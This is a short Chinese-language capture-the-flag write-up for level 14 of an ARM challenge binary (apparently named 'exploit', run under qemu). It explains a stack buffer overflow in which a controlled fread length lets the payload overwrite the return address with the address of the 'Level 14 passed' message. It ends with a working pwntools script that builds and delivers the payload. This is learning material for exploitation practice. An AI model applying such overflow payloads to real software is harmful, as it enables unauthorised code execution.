拿到 最后一关密码 Jumper

第十四关

思路理清楚接就是 生成本地文件 文件存放payload（溢出偏移覆盖v11的值为22136）,然后运行程序读取文件即可

v3+v4+v5+v6+v7+v8+v9+v10=4+4+4+4+4+4+4+4=32

gdb动态调试到程序崩溃是36

经过n多次测试 这个思路行不通，因为fread(v3, 1u, ptr, stream); 后下面是v11 = 0 ,换思路直接覆盖掉v13然后跳到 puts(“\nLevel 14 passed. Well done !”); 地址达到效果

先ida拿到通过地址 0x115A4

构造

fread(&ptr, 1u, 4u, stream); // 先覆盖ptr = 偏移+4
fread(v3, 1u, ptr, stream); //v3-v13 ==>32+4(v11)+4(stream)=40

from pwn import *
import os
win = 0x000115A4
offset = 40
ptr = offset + 4
payload =p32(ptr)+b'a'*offset+p32(win)

f = open('token.txt','wb')

f.write(payload)
f.close()

cmd = ['qemu-arm','-L','/usr/arm-linux-gnueabi','./exploit','Jumper','token.txt']

p = process(cmd)

p.interactive()
